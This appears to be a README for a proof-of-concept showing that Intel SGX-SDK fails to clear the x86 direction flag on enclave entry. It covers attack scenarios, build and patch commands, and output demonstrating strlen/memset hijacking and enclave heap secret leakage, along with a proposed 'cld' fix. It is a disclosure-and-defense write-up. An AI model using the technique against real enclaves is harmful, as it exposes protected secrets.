# SGX-DF: Enclave direction flag hijacking attacks

## Attack overview

We noticed that Intel SGX-SDK currently does _not_ sanitize x86's direction flag `RFLAGS.DF` on enclave entry. This is problematic since trusted enclave code may now incorrectly assume that `RFLAGS.DF` is properly cleared on function entry, i.e., as mandated by the x86-64 sysv ABI and many others (see <https://www.agner.org/optimize/calling_conventions.pdf>). We indeed verified that for instance the commonly used `gcc v5.4` compiler replaces a.o., `strlen()` and `memset()` with inlined x86 string instructions at optimization level `-Os`. We show that by setting the direction flag in an unexpected "decrement" direction right before EENTER in the untrusted runtime, attackers can cause incorrect `strlen()` computations and memory corruption when overwriting unintended memory locations with `memset`.

We developed a minimal sample enclave to showcase such unexpected behaviors in the following scenarios:

1. unexpected `strlen()` result (which can easily lead to subsequent enclave memory corruptions)
2. illegal `memset` enclave memory corruption
3. enclave heap corruption and leakage of uninitialized heap memory in `edger8r` auto-generated code
4. side-channel leakage of the in-enclave `RFLAGS.DF` value on EEXIT and AEX

For the heap exploit demo, we added an ecall that expects buf[] to be memset to zero in the edger8r code. However, setting DF=1 before EENTER causes the memset direction to be inverted and the preceding heap fields to be corrupted. This ultimately leads to a (non-exploitable) crash on the next `free()` invocation in the edger8r code. The malloc chunk's size and prev_meta_data_ptr fields are erroneously zeroed, leading to an illegal pointer computation. Fortunately, the enclave malloc implementation is hardened and the resulting NULL pointer is XORed with a secret 64-bit `mparam.magic` value, leading to a non-canonical address dereference and eventually a #GP that halts the enclave. However our demo showcases that, before finally calling `free()` and detecting the heap corruption, the trusted edger8r-generated code first still copies uninitialized heap memory containing enclave secrets to attacker-controlled memory outside the enclave.

## Proposed software-level defense

We propose to completely eliminate attack surface from `RFLAGS.DF` by changing the enclave's trusted runtime to always clear this flag after entering and before exiting the enclave. We implemented this countermeasure for the latest Intel SGX-SDK (`linux-sgx v2.6`), and experimentally verified that it indeed blocks all leakage in our proof-of-concept attacks. 

The complete patch can be found in attach, and merely adds the following to the enclave entry/exit code:

```
cld                         /* DF = 0 as required by x86-64 ABI */
```

Note that clearing `RFLAGS.DF` on enclave entry is an absolute requirement for enclave correctness, whereas clearing `RFLAGS.DF` on enclave exit is merely a preferable measure to minimize software-induced side-channel leakage. Regarding side-channel leakage, it should also be noted that our proof-of-concept shows that AEX does _not_ clear `RFLAGS.DF` on asynchronous enclave exit. We consider this to be a relatively harmless, yet unnecessary leakage source that may in turn reveal side-channel information about the enclaved computation. Unfortunately, since software does not control the synthetic state established by AEX, there seems to be no way to completely get rid of this unnecessary side-channel leakage through software changes. Combined with a single-stepping attack primitive like [SGX-Step](https://github.com/jovanbulck/sgx-step), attackers can establish the in-enclave value of `RFLAGS.DF` after _every_ single instruction in the enclave. As we see no reason why AEX does not clear `RFLAGS.DF` in the synthetic state, we recommend to eliminate this unnecessary residual leakage in future microcode updates.

## Building and running

### 1. Patch SGX-SDK untrusted runtime

We found that we cannot simply execute `asm("std")` in the untrusted application code since the untrusted runtime code may still clear `RFLAGS.DF` before actually entering the enclave. We therefore had to modify the _untrusted_ runtime to allow setting RFLAGS.DF right before EENTER through a custom function. Our patch can be applied as follows (tested on linux-sgx v2.6 commit 34421657a370c00a1a55fbf8ee29b2a1a07663e8):

```
$ cd linux-sgx/
$ git apply 0001-URTS-modifications-to-modify-RFLAGS.DF-before-EENTER.patch
```

Likewise, apply our proposed defense as follows:

```
$ git apply 0001-Sanitize-RFLAGS.DF-on-enclave-entry.patch
```

### 2. Build and run proof-of-concept enclave code

Our proof-of-concept enclave code has been developed with the latest SGX-SDK `linux-sgx v2.6` and can be ran as follows (sample output included below):

```
$ cd sgx-df-poc/
$ make run
```

## Sample output (vulnerable runtime)

For reference, expected output is as follows (as ran on a recent i7-8650U processor):

```
$ gcc --version
gcc (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
Copyright (C) 2015 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

$ make run
Creating enclave...
--> OK

--------------------------------------------------
RFLAGS.DF strlen direction hijack
--------------------------------------------------

Running victim w DF=0
enclave strlen=1

Running victim w DF=1
enclave strlen=3

Running victim w DF=0
enclave strlen=1

Running victim w DF=1
enclave strlen=3

--------------------------------------------------
RFLAGS.DF memset direction hijack
--------------------------------------------------

Running victim w DF=0
enclave memset=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Running victim w DF=1
enclave memset=XAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

Running victim w DF=0
enclave memset=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Running victim w DF=1
enclave memset=XAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

--------------------------------------------------
RFLAGS.DF side-channel leakage EEXIT/AEX
--------------------------------------------------
Registering fault handler...

Running victim w set=0; scrub=0
RFLAGS after AEX=0x202   (DF=0)
RFLAGS after EEXIT=0x246 (DF=0)

Running victim w set=1; scrub=0
RFLAGS after AEX=0x602   (DF=1)
RFLAGS after EEXIT=0x646 (DF=1)

Running victim w set=0; scrub=1
RFLAGS after AEX=0x202   (DF=0)
RFLAGS after EEXIT=0x246 (DF=0)

Running victim w set=1; scrub=1
RFLAGS after AEX=0x602   (DF=1)
RFLAGS after EEXIT=0x246 (DF=0)

--------------------------------------------------
RFLAGS.DF edger8r memset heap corruption
--------------------------------------------------

Spraying enclave heap with secret 'S'
Running victim w DF=0
--> OK
enclave output buf=0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

Spraying enclave heap with secret 'S'
Running victim w DF=1
--> FAIL
enclave output buf=0000SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS

page fault when dereferencing (nil); exiting..
```

## Sample output (patched runtime)

For reference, expected output is as follows _after_ applying our proposed security patch to the enclave trusted runtime:

```
$ make run

Creating enclave...
--> OK

--------------------------------------------------
RFLAGS.DF strlen direction hijack
--------------------------------------------------

Running victim w DF=0
enclave strlen=1

Running victim w DF=1
enclave strlen=1

Running victim w DF=0
enclave strlen=1

Running victim w DF=1
enclave strlen=1

--------------------------------------------------
RFLAGS.DF memset direction hijack
--------------------------------------------------

Running victim w DF=0
enclave memset=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Running victim w DF=1
enclave memset=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Running victim w DF=0
enclave memset=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Running victim w DF=1
enclave memset=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

--------------------------------------------------
RFLAGS.DF side-channel leakage EEXIT/AEX
--------------------------------------------------
Registering fault handler...

Running victim w set=0; scrub=0
RFLAGS after AEX=0x202   (DF=0)
RFLAGS after EEXIT=0x246 (DF=0)

Running victim w set=1; scrub=0
RFLAGS after AEX=0x602   (DF=1)
RFLAGS after EEXIT=0x246 (DF=0)

Running victim w set=0; scrub=1
RFLAGS after AEX=0x202   (DF=0)
RFLAGS after EEXIT=0x246 (DF=0)

Running victim w set=1; scrub=1
RFLAGS after AEX=0x602   (DF=1)
RFLAGS after EEXIT=0x246 (DF=0)

--------------------------------------------------
RFLAGS.DF edger8r memset heap corruption
--------------------------------------------------

Spraying enclave heap with secret 'S'
Running victim w DF=0
--> OK
enclave output buf=0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

Spraying enclave heap with secret 'S'
Running victim w DF=1
--> OK
enclave output buf=0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

Spraying enclave heap with secret 'S'
Running victim w DF=0
--> OK
enclave output buf=0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

Spraying enclave heap with secret 'S'
Running victim w DF=1
--> OK
enclave output buf=0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

all is well; exiting..
```
